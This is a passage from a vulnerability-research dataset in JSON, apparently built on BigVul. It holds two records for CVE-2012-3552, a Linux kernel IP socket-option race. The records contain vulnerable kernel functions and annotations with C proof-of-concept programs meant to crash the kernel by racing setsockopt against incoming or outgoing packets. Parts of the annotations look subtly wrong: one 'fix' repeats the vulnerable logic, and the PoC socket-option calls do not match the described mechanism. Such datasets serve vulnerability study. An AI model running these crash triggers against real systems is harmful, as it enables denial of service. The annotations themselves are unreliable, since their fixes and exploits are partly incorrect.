        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv6/tcp_ipv6.c": "static struct sock * tcp_v6_syn_recv_sock(struct sock *sk, struct sk_buff *skb,\n\t\t\t\t\t  struct request_sock *req,\n\t\t\t\t\t  struct dst_entry *dst)\n{\n\tstruct inet6_request_sock *treq;\n\tstruct ipv6_pinfo *newnp, *np = inet6_sk(sk);\n\tstruct tcp6_sock *newtcp6sk;\n\tstruct inet_sock *newinet;\n\tstruct tcp_sock *newtp;\n\tstruct sock *newsk;\n\tstruct ipv6_txoptions *opt;\n#ifdef CONFIG_TCP_MD5SIG\n\tstruct tcp_md5sig_key *key;\n#endif\n\n\tif (skb->protocol == htons(ETH_P_IP)) {\n\t\t/*\n\t\t *\tv6 mapped\n\t\t */\n\n\t\tnewsk = tcp_v4_syn_recv_sock(sk, skb, req, dst);\n\n\t\tif (newsk == NULL)\n\t\t\treturn NULL;\n\n\t\tnewtcp6sk = (struct tcp6_sock *)newsk;\n\t\tinet_sk(newsk)->pinet6 = &newtcp6sk->inet6;\n\n\t\tnewinet = inet_sk(newsk);\n\t\tnewnp = inet6_sk(newsk);\n\t\tnewtp = tcp_sk(newsk);\n\n\t\tmemcpy(newnp, np, sizeof(struct ipv6_pinfo));\n\n\t\tipv6_addr_set_v4mapped(newinet->inet_daddr, &newnp->daddr);\n\n\t\tipv6_addr_set_v4mapped(newinet->inet_saddr, &newnp->saddr);\n\n\t\tipv6_addr_copy(&newnp->rcv_saddr, &newnp->saddr);\n\n\t\tinet_csk(newsk)->icsk_af_ops = &ipv6_mapped;\n\t\tnewsk->sk_backlog_rcv = tcp_v4_do_rcv;\n#ifdef CONFIG_TCP_MD5SIG\n\t\tnewtp->af_specific = &tcp_sock_ipv6_mapped_specific;\n#endif\n\n\t\tnewnp->pktoptions  = NULL;\n\t\tnewnp->opt\t   = NULL;\n\t\tnewnp->mcast_oif   = inet6_iif(skb);\n\t\tnewnp->mcast_hops  = ipv6_hdr(skb)->hop_limit;\n\n\t\t/*\n\t\t * No need to charge this sock to the relevant IPv6 refcnt debug socks count\n\t\t * here, tcp_create_openreq_child now does this for us, see the comment in\n\t\t * that function for the gory details. -acme\n\t\t */\n\n\t\t/* It is tricky place. Until this moment IPv4 tcp\n\t\t   worked with IPv6 icsk.icsk_af_ops.\n\t\t   Sync it now.\n\t\t */\n\t\ttcp_sync_mss(newsk, inet_csk(newsk)->icsk_pmtu_cookie);\n\n\t\treturn newsk;\n\t}\n\n\ttreq = inet6_rsk(req);\n\topt = np->opt;\n\n\tif (sk_acceptq_is_full(sk))\n\t\tgoto out_overflow;\n\n\tif (!dst) {\n\t\tdst = inet6_csk_route_req(sk, req);\n\t\tif (!dst)\n\t\t\tgoto out;\n\t}\n\n\tnewsk = tcp_create_openreq_child(sk, req, skb);\n\tif (newsk == NULL)\n\t\tgoto out_nonewsk;\n\n\t/*\n\t * No need to charge this sock to the relevant IPv6 refcnt debug socks\n\t * count here, tcp_create_openreq_child now does this for us, see the\n\t * comment in that function for the gory details. -acme\n\t */\n\n\tnewsk->sk_gso_type = SKB_GSO_TCPV6;\n\t__ip6_dst_store(newsk, dst, NULL, NULL);\n\n\tnewtcp6sk = (struct tcp6_sock *)newsk;\n\tinet_sk(newsk)->pinet6 = &newtcp6sk->inet6;\n\n\tnewtp = tcp_sk(newsk);\n\tnewinet = inet_sk(newsk);\n\tnewnp = inet6_sk(newsk);\n\n\tmemcpy(newnp, np, sizeof(struct ipv6_pinfo));\n\n\tipv6_addr_copy(&newnp->daddr, &treq->rmt_addr);\n\tipv6_addr_copy(&newnp->saddr, &treq->loc_addr);\n\tipv6_addr_copy(&newnp->rcv_saddr, &treq->loc_addr);\n\tnewsk->sk_bound_dev_if = treq->iif;\n\n\t/* Now IPv6 options...\n \n \t   First: no IPv4 options.\n \t */\n\tnewinet->opt = NULL;\n \tnewnp->ipv6_fl_list = NULL;\n \n \t/* Clone RX bits */\n\tnewnp->rxopt.all = np->rxopt.all;\n\n\t/* Clone pktoptions received with SYN */\n\tnewnp->pktoptions = NULL;\n\tif (treq->pktopts != NULL) {\n\t\tnewnp->pktoptions = skb_clone(treq->pktopts, GFP_ATOMIC);\n\t\tkfree_skb(treq->pktopts);\n\t\ttreq->pktopts = NULL;\n\t\tif (newnp->pktoptions)\n\t\t\tskb_set_owner_r(newnp->pktoptions, newsk);\n\t}\n\tnewnp->opt\t  = NULL;\n\tnewnp->mcast_oif  = inet6_iif(skb);\n\tnewnp->mcast_hops = ipv6_hdr(skb)->hop_limit;\n\n\t/* Clone native IPv6 options from listening socket (if any)\n\n\t   Yes, keeping reference count would be much more clever,\n\t   but we make one more one thing there: reattach optmem\n\t   to newsk.\n\t */\n\tif (opt) {\n\t\tnewnp->opt = ipv6_dup_options(newsk, opt);\n\t\tif (opt != np->opt)\n\t\t\tsock_kfree_s(sk, opt, opt->tot_len);\n\t}\n\n\tinet_csk(newsk)->icsk_ext_hdr_len = 0;\n\tif (newnp->opt)\n\t\tinet_csk(newsk)->icsk_ext_hdr_len = (newnp->opt->opt_nflen +\n\t\t\t\t\t\t     newnp->opt->opt_flen);\n\n\ttcp_mtup_init(newsk);\n\ttcp_sync_mss(newsk, dst_mtu(dst));\n\tnewtp->advmss = dst_metric_advmss(dst);\n\ttcp_initialize_rcv_mss(newsk);\n\n\tnewinet->inet_daddr = newinet->inet_saddr = LOOPBACK4_IPV6;\n\tnewinet->inet_rcv_saddr = LOOPBACK4_IPV6;\n\n#ifdef CONFIG_TCP_MD5SIG\n\t/* Copy over the MD5 key from the original socket */\n\tif ((key = tcp_v6_md5_do_lookup(sk, &newnp->daddr)) != NULL) {\n\t\t/* We're using one, so create a matching key\n\t\t * on the newsk structure. If we fail to get\n\t\t * memory, then we end up not copying the key\n\t\t * across. Shucks.\n\t\t */\n\t\tchar *newkey = kmemdup(key->key, key->keylen, GFP_ATOMIC);\n\t\tif (newkey != NULL)\n\t\t\ttcp_v6_md5_do_add(newsk, &newnp->daddr,\n\t\t\t\t\t  newkey, key->keylen);\n\t}\n#endif\n\n\tif (__inet_inherit_port(sk, newsk) < 0) {\n\t\tsock_put(newsk);\n\t\tgoto out;\n\t}\n\t__inet6_hash(newsk, NULL);\n\n\treturn newsk;\n\nout_overflow:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENOVERFLOWS);\nout_nonewsk:\n\tif (opt && opt != np->opt)\n\t\tsock_kfree_s(sk, opt, opt->tot_len);\n\tdst_release(dst);\nout:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENDROPS);\n\treturn NULL;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IPv6 TCP socket options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race condition)\n\n[Mandatory] Summary:\nA race condition exists in the Linux kernel's tcp_v6_syn_recv_sock() function when handling IPv6 TCP connection requests with socket options. The function reads the socket options pointer (opt = np->opt) from the parent socket's inet6_pinfo structure and later checks if it has changed (if (opt != np->opt)) before freeing, but no synchronization prevents another thread from modifying or freeing np->opt between these accesses. An attacker can send specially crafted IPv6 TCP packets while triggering concurrent socket option modifications to cause a time-of-check-time-of-use (TOCTOU) race, resulting in slab memory corruption and kernel crash.\n\n[Mandatory] Root cause:\nThe inet->opt (inet6_pinfo.opt) field is accessed and modified without RCU synchronization, allowing concurrent threads to read stale pointers or use freed memory when the options structure is modified by another thread during socket creation.\n\n[Mandatory] Attack Surface:\nLinux kernel IPv6 TCP network stack \u2014 specifically the tcp_v6_syn_recv_sock() connection establishment handler\n\n[Mandatory] Impact Summary:\nDenial of service via kernel crash (slab corruption)\n\n[Optional] Trigger / Attack vector:\nRemote malicious IPv6 TCP SYN packets sent concurrently with socket option modifications on the listening socket\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nopt = np->opt;\n...\nif (opt) {\n    newnp->opt = ipv6_dup_options(newsk, opt);\n    if (opt != np->opt)\n        sock_kfree_s(sk, opt, opt->tot_len);\n}\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nIPv6 TCP connection establishment with concurrent socket option modification via setsockopt()\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free read; slab corruption write via freed structure\n\n[Mandatory] Exploitability summary (1 sentence):\nThe race window is narrow but triggerable from unprivileged userspace by orchestrating concurrent setsockopt() calls and incoming IPv6 TCP packets on the same listening socket.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create an IPv6 listening socket and bind it to a port\n- Spawn a thread that continuously sets IPV6 socket options (e.g., IPV6_MTU, IPV6_RXHLIM) to trigger modification of np->opt\n- Send a stream of IPv6 TCP SYN packets to the listening socket from another thread/host to trigger tcp_v6_syn_recv_sock() calls\n- The race between option modification and socket creation causes opt to dangle or be freed while ipv6_dup_options() or sock_kfree_s() is still accessing it\n- Kernel slab corruption manifests as NULL pointer dereference or heap corruption, triggering kernel crash\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvoid *modify_options(void *arg) {\n    int sock = *(int *)arg;\n    struct ipv6_mtuinfo mtu = {.ip6m_mtu = 1280};\n    while (1) {\n        setsockopt(sock, IPPROTO_IPV6, IPV6_MTU, &mtu, sizeof(mtu));\n        setsockopt(sock, IPPROTO_IPV6, IPV6_RXHLIM, &mtu, sizeof(mtu));\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET6, SOCK_STREAM, 0);\n    struct sockaddr_in6 addr = {.sin6_family = AF_INET6, .sin6_port = htons(9999)};\n    bind(sock, (struct sockaddr *)&addr, sizeof(addr));\n    listen(sock, 128);\n    \n    pthread_t tid;\n    pthread_create(&tid, NULL, modify_options, &sock);\n    \n    // Race: send SYN packets while options are modified\n    system(\"timeout 5 hping3 -S ::1 -p 9999 -i u100 2>/dev/null &\");\n    sleep(6);\n    close(sock);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nopt = np->opt;\n...\nif (opt) {\n    newnp->opt = ipv6_dup_options(newsk, opt);\n    if (opt != np->opt)\n        sock_kfree_s(sk, opt, opt->tot_len);\n}\n/* Original: */\nnewinet->opt = NULL;\n/* Fixed: */\nnewinet->inet_opt = NULL;\n```\n\n[Mandatory] Fix summary:\nThe patch adds RCU (Read-Copy-Update) synchronization by renaming the unprotected opt field to inet_opt and wrapping accesses with rcu_dereference_protected() and rcu_read_lock()/rcu_read_unlock(). This prevents concurrent modification of the options structure while it is being copied or freed, eliminating the TOCTOU race.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259 (Linux kernel)\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nThe fix replaces unsynchronized direct pointer access to inet->opt with RCU-protected access using rcu_dereference() and introduces a new inet->inet_opt field to hold the RCU-protected pointer. Writers use synchronize_rcu() and readers use rcu_read_lock(), ensuring no thread can free the structure while another is reading it.\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Audit other socket option handlers (tcp_v4_syn_recv_sock, tcp_dccp_syn_recv_sock) for similar unprotected inet->opt access\n- Review all setsockopt() paths that modify inet->opt to ensure they use proper RCU write-side synchronization\n- Fuzz socket option setting concurrent with connection establishment on IPv4 and IPv6 to detect similar races\n\n[Optional] Likely variants/impact (one line):\nSimilar TOCTOU races may exist in IPv4 TCP and other protocol handlers that access socket options during connection setup without RCU synchronization.",
        "tests": "NA",
        "solutions": "static struct sock * tcp_v6_syn_recv_sock(struct sock *sk, struct sk_buff *skb,\n\t\t\t\t\t  struct request_sock *req,\n\t\t\t\t\t  struct dst_entry *dst)\n{\n\tstruct inet6_request_sock *treq;\n\tstruct ipv6_pinfo *newnp, *np = inet6_sk(sk);\n\tstruct tcp6_sock *newtcp6sk;\n\tstruct inet_sock *newinet;\n\tstruct tcp_sock *newtp;\n\tstruct sock *newsk;\n\tstruct ipv6_txoptions *opt;\n#ifdef CONFIG_TCP_MD5SIG\n\tstruct tcp_md5sig_key *key;\n#endif\n\n\tif (skb->protocol == htons(ETH_P_IP)) {\n\t\t/*\n\t\t *\tv6 mapped\n\t\t */\n\n\t\tnewsk = tcp_v4_syn_recv_sock(sk, skb, req, dst);\n\n\t\tif (newsk == NULL)\n\t\t\treturn NULL;\n\n\t\tnewtcp6sk = (struct tcp6_sock *)newsk;\n\t\tinet_sk(newsk)->pinet6 = &newtcp6sk->inet6;\n\n\t\tnewinet = inet_sk(newsk);\n\t\tnewnp = inet6_sk(newsk);\n\t\tnewtp = tcp_sk(newsk);\n\n\t\tmemcpy(newnp, np, sizeof(struct ipv6_pinfo));\n\n\t\tipv6_addr_set_v4mapped(newinet->inet_daddr, &newnp->daddr);\n\n\t\tipv6_addr_set_v4mapped(newinet->inet_saddr, &newnp->saddr);\n\n\t\tipv6_addr_copy(&newnp->rcv_saddr, &newnp->saddr);\n\n\t\tinet_csk(newsk)->icsk_af_ops = &ipv6_mapped;\n\t\tnewsk->sk_backlog_rcv = tcp_v4_do_rcv;\n#ifdef CONFIG_TCP_MD5SIG\n\t\tnewtp->af_specific = &tcp_sock_ipv6_mapped_specific;\n#endif\n\n\t\tnewnp->pktoptions  = NULL;\n\t\tnewnp->opt\t   = NULL;\n\t\tnewnp->mcast_oif   = inet6_iif(skb);\n\t\tnewnp->mcast_hops  = ipv6_hdr(skb)->hop_limit;\n\n\t\t/*\n\t\t * No need to charge this sock to the relevant IPv6 refcnt debug socks count\n\t\t * here, tcp_create_openreq_child now does this for us, see the comment in\n\t\t * that function for the gory details. -acme\n\t\t */\n\n\t\t/* It is tricky place. Until this moment IPv4 tcp\n\t\t   worked with IPv6 icsk.icsk_af_ops.\n\t\t   Sync it now.\n\t\t */\n\t\ttcp_sync_mss(newsk, inet_csk(newsk)->icsk_pmtu_cookie);\n\n\t\treturn newsk;\n\t}\n\n\ttreq = inet6_rsk(req);\n\topt = np->opt;\n\n\tif (sk_acceptq_is_full(sk))\n\t\tgoto out_overflow;\n\n\tif (!dst) {\n\t\tdst = inet6_csk_route_req(sk, req);\n\t\tif (!dst)\n\t\t\tgoto out;\n\t}\n\n\tnewsk = tcp_create_openreq_child(sk, req, skb);\n\tif (newsk == NULL)\n\t\tgoto out_nonewsk;\n\n\t/*\n\t * No need to charge this sock to the relevant IPv6 refcnt debug socks\n\t * count here, tcp_create_openreq_child now does this for us, see the\n\t * comment in that function for the gory details. -acme\n\t */\n\n\tnewsk->sk_gso_type = SKB_GSO_TCPV6;\n\t__ip6_dst_store(newsk, dst, NULL, NULL);\n\n\tnewtcp6sk = (struct tcp6_sock *)newsk;\n\tinet_sk(newsk)->pinet6 = &newtcp6sk->inet6;\n\n\tnewtp = tcp_sk(newsk);\n\tnewinet = inet_sk(newsk);\n\tnewnp = inet6_sk(newsk);\n\n\tmemcpy(newnp, np, sizeof(struct ipv6_pinfo));\n\n\tipv6_addr_copy(&newnp->daddr, &treq->rmt_addr);\n\tipv6_addr_copy(&newnp->saddr, &treq->loc_addr);\n\tipv6_addr_copy(&newnp->rcv_saddr, &treq->loc_addr);\n\tnewsk->sk_bound_dev_if = treq->iif;\n\n\t/* Now IPv6 options...\n \n \t   First: no IPv4 options.\n \t */\n\tnewinet->inet_opt = NULL;\n \tnewnp->ipv6_fl_list = NULL;\n \n \t/* Clone RX bits */\n\tnewnp->rxopt.all = np->rxopt.all;\n\n\t/* Clone pktoptions received with SYN */\n\tnewnp->pktoptions = NULL;\n\tif (treq->pktopts != NULL) {\n\t\tnewnp->pktoptions = skb_clone(treq->pktopts, GFP_ATOMIC);\n\t\tkfree_skb(treq->pktopts);\n\t\ttreq->pktopts = NULL;\n\t\tif (newnp->pktoptions)\n\t\t\tskb_set_owner_r(newnp->pktoptions, newsk);\n\t}\n\tnewnp->opt\t  = NULL;\n\tnewnp->mcast_oif  = inet6_iif(skb);\n\tnewnp->mcast_hops = ipv6_hdr(skb)->hop_limit;\n\n\t/* Clone native IPv6 options from listening socket (if any)\n\n\t   Yes, keeping reference count would be much more clever,\n\t   but we make one more one thing there: reattach optmem\n\t   to newsk.\n\t */\n\tif (opt) {\n\t\tnewnp->opt = ipv6_dup_options(newsk, opt);\n\t\tif (opt != np->opt)\n\t\t\tsock_kfree_s(sk, opt, opt->tot_len);\n\t}\n\n\tinet_csk(newsk)->icsk_ext_hdr_len = 0;\n\tif (newnp->opt)\n\t\tinet_csk(newsk)->icsk_ext_hdr_len = (newnp->opt->opt_nflen +\n\t\t\t\t\t\t     newnp->opt->opt_flen);\n\n\ttcp_mtup_init(newsk);\n\ttcp_sync_mss(newsk, dst_mtu(dst));\n\tnewtp->advmss = dst_metric_advmss(dst);\n\ttcp_initialize_rcv_mss(newsk);\n\n\tnewinet->inet_daddr = newinet->inet_saddr = LOOPBACK4_IPV6;\n\tnewinet->inet_rcv_saddr = LOOPBACK4_IPV6;\n\n#ifdef CONFIG_TCP_MD5SIG\n\t/* Copy over the MD5 key from the original socket */\n\tif ((key = tcp_v6_md5_do_lookup(sk, &newnp->daddr)) != NULL) {\n\t\t/* We're using one, so create a matching key\n\t\t * on the newsk structure. If we fail to get\n\t\t * memory, then we end up not copying the key\n\t\t * across. Shucks.\n\t\t */\n\t\tchar *newkey = kmemdup(key->key, key->keylen, GFP_ATOMIC);\n\t\tif (newkey != NULL)\n\t\t\ttcp_v6_md5_do_add(newsk, &newnp->daddr,\n\t\t\t\t\t  newkey, key->keylen);\n\t}\n#endif\n\n\tif (__inet_inherit_port(sk, newsk) < 0) {\n\t\tsock_put(newsk);\n\t\tgoto out;\n\t}\n\t__inet6_hash(newsk, NULL);\n\n\treturn newsk;\n\nout_overflow:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENOVERFLOWS);\nout_nonewsk:\n\tif (opt && opt != np->opt)\n\t\tsock_kfree_s(sk, opt, opt->tot_len);\n\tdst_release(dst);\nout:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENDROPS);\n\treturn NULL;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/l2tp/l2tp_ip.c": "static int l2tp_ip_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg, size_t len)\n{\n\tstruct sk_buff *skb;\n \tint rc;\n \tstruct l2tp_ip_sock *lsa = l2tp_ip_sk(sk);\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options *opt = inet->opt;\n \tstruct rtable *rt = NULL;\n \tint connected = 0;\n \t__be32 daddr;\n\n\tif (sock_flag(sk, SOCK_DEAD))\n\t\treturn -ENOTCONN;\n\n\t/* Get and verify the address. */\n\tif (msg->msg_name) {\n\t\tstruct sockaddr_l2tpip *lip = (struct sockaddr_l2tpip *) msg->msg_name;\n\t\tif (msg->msg_namelen < sizeof(*lip))\n\t\t\treturn -EINVAL;\n\n\t\tif (lip->l2tp_family != AF_INET) {\n\t\t\tif (lip->l2tp_family != AF_UNSPEC)\n\t\t\t\treturn -EAFNOSUPPORT;\n\t\t}\n\n\t\tdaddr = lip->l2tp_addr.s_addr;\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\treturn -EDESTADDRREQ;\n\n\t\tdaddr = inet->inet_daddr;\n\t\tconnected = 1;\n\t}\n\n\t/* Allocate a socket buffer */\n\trc = -ENOMEM;\n\tskb = sock_wmalloc(sk, 2 + NET_SKB_PAD + sizeof(struct iphdr) +\n\t\t\t   4 + len, 0, GFP_KERNEL);\n\tif (!skb)\n\t\tgoto error;\n\n\t/* Reserve space for headers, putting IP header on 4-byte boundary. */\n\tskb_reserve(skb, 2 + NET_SKB_PAD);\n\tskb_reset_network_header(skb);\n\tskb_reserve(skb, sizeof(struct iphdr));\n\tskb_reset_transport_header(skb);\n\n\t/* Insert 0 session_id */\n\t*((__be32 *) skb_put(skb, 4)) = 0;\n\n\t/* Copy user data into skb */\n\trc = memcpy_fromiovec(skb_put(skb, len), msg->msg_iov, len);\n\tif (rc < 0) {\n\t\tkfree_skb(skb);\n\t\tgoto error;\n\t}\n\n\tif (connected)\n \t\trt = (struct rtable *) __sk_dst_check(sk, 0);\n \n \tif (rt == NULL) {\n \t\t/* Use correct destination address if we have options. */\n\t\tif (opt && opt->srr)\n\t\t\tdaddr = opt->faddr;\n \n \t\t/* If this fails, retransmit mechanism of transport layer will\n \t\t * keep trying until route appears or the connection times\n\t\t * itself out.\n\t\t */\n\t\trt = ip_route_output_ports(sock_net(sk), sk,\n\t\t\t\t\t   daddr, inet->inet_saddr,\n\t\t\t\t\t   inet->inet_dport, inet->inet_sport,\n\t\t\t\t\t   sk->sk_protocol, RT_CONN_FLAGS(sk),\n\t\t\t\t\t   sk->sk_bound_dev_if);\n\t\tif (IS_ERR(rt))\n\t\t\tgoto no_route;\n\t\tsk_setup_caps(sk, &rt->dst);\n\t}\n\tskb_dst_set(skb, dst_clone(&rt->dst));\n\n\t/* Queue the packet to IP for output */\n\trc = ip_queue_xmit(skb);\n\nerror:\n\t/* Update stats */\n\tif (rc >= 0) {\n\t\tlsa->tx_packets++;\n\t\tlsa->tx_bytes += len;\n\t\trc = len;\n\t} else {\n\t\tlsa->tx_errors++;\n\t}\n\n\treturn rc;\n\nno_route:\n\tIP_INC_STATS(sock_net(sk), IPSTATS_MIB_OUTNOROUTES);\n\tkfree_skb(skb);\n\treturn -EHOSTUNREACH;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in IP socket options handling\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\nAffected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362 (Race condition) / Race condition in L2TP IP options handling\n\nSummary:\nA race condition exists in l2tp_ip_sendmsg() where the code reads inet->opt (via direct pointer dereference at function start) and later accesses opt->srr without synchronization. A concurrent thread can modify or free inet->opt between these accesses, causing the function to dereference a freed or modified ip_options structure. Remote attackers can trigger this by sending packets to an application that concurrently modifies socket options, causing slab corruption and kernel crash.\n\nRoot cause:\nDirect unsynchronized access to inet->opt pointer that can be concurrently modified or freed by another thread manipulating socket options.\n\nAttack Surface:\nL2TP IP socket layer, network packet transmission path\n\nImpact Summary:\nDenial of service (slab corruption and system crash)\n\nTrigger / Attack vector:\nConcurrent socket option modification (setsockopt) and packet transmission (sendmsg) via network packets\n\nKey code/struct excerpt (minimal):\n```c\nstruct ip_options *opt = inet->opt;\n...\nif (rt == NULL) {\n    /* Use correct destination address if we have options. */\n    if (opt && opt->srr)\n        daddr = opt->faddr;\n    \n    rt = ip_route_output_ports(sock_net(sk), sk,\n                               daddr, inet->inet_saddr,\n                               inet->inet_dport, inet->inet_sport,\n                               sk->sk_protocol, RT_CONN_FLAGS(sk),\n                               sk->sk_bound_dev_if);\n```\n\nExploit:\n\nTrigger surface/attack vector:\nSocket API (setsockopt, sendto/sendmsg) on L2TP IP sockets\n\nExploit primitive(s) available:\nRace condition enabling use-after-free of ip_options structure, leading to arbitrary memory corruption via slab corruption\n\nExploitability summary:\nThe vulnerability is readily exploitable through normal socket operations without requiring elevated privileges; concurrent modification of socket options and packet transmission triggers the race window easily.\n\nExploit script (summary):\n- Create an L2TP socket (or connect it to a peer)\n- Spawn two threads: one repeatedly calling sendmsg() to send packets, another repeatedly modifying socket options via setsockopt()\n- The race condition between reading inet->opt in l2tp_ip_sendmsg() and concurrent setsockopt() modifications causes a thread to dereference freed or corrupted memory\n- Slab corruption and kernel crash occur\n\nExploitation Example script payload code:\n```c\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <pthread.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid *sender_thread(void *arg) {\n    int sock = *(int *)arg;\n    struct sockaddr_in addr;\n    char buf[64] = \"data\";\n    memset(&addr, 0, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n    addr.sin_port = htons(1701);\n    while(1) sendto(sock, buf, sizeof(buf), 0, \n                    (struct sockaddr*)&addr, sizeof(addr));\n    return NULL;\n}\n\nvoid *options_thread(void *arg) {\n    int sock = *(int *)arg;\n    int val = 1;\n    while(1) setsockopt(sock, IPPROTO_IP, IP_OPTIONS, \n                       &val, sizeof(val));\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_L2TP);\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, sender_thread, &sock);\n    pthread_create(&t2, NULL, options_thread, &sock);\n    pthread_join(t1, NULL);\n    return 0;\n}\n```\n\nFix\n\nFix code:\n```c\nif (rt == NULL) {\n    struct ip_options_rcu *inet_opt;\n    \n    inet_opt = rcu_dereference_protected(inet->inet_opt,\n                                         sock_owned_by_user(sk));\n    \n    /* Use correct destination address if we have options. */\n    if (inet_opt && inet_opt->opt.srr)\n        daddr = inet_opt->opt.faddr;\n    \n    rt = ip_route_output_ports(sock_net(sk), sk,\n                               daddr, inet->inet_saddr,\n                               inet->inet_dport, inet->inet_sport,\n                               sk->sk_protocol, RT_CONN_FLAGS(sk),\n                               sk->sk_bound_dev_if);\n```\n\nFix summary:\nThe patch introduces RCU (Read-Copy-Update) synchronization for inet->opt (renamed to inet->inet_opt as struct ip_options_rcu). Instead of direct pointer access, the code uses rcu_dereference_protected() with sock_owned_by_user() check to safely dereference the pointer, ensuring proper synchronization between concurrent readers and modifiers.\n\nPatch reference:\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe patch introduces RCU protection and wraps inet->opt in a new ip_options_rcu structure. Instead of direct pointer reads, code uses rcu_dereference_protected() to safely access the structure, preventing use-after-free by ensuring proper synchronization with concurrent setsockopt() operations that modify socket options.\n\nPatchType: Synchronization mechanism added (RCU protection introduced)\n\nVariant & Triage Guidance\n\nVariant analysis suggestions:\n- Review other network protocol handlers (TCP, UDP, ICMP) for similar direct unsynchronized access to shared socket structures like inet->opt\n- Audit all code paths accessing inet->inet_opt in network layer functions for proper RCU or lock-based synchronization\n- Check for races in ip_make_skb(), ip_setup_cork() and related IP option handling functions across protocol families\n\nLikely variants/impact:\nSimilar race conditions in TCP/UDP/ICMP handlers accessing shared socket state without RCU/lock protection, leading to DoS or memory corruption in network processing.",
        "tests": "NA",
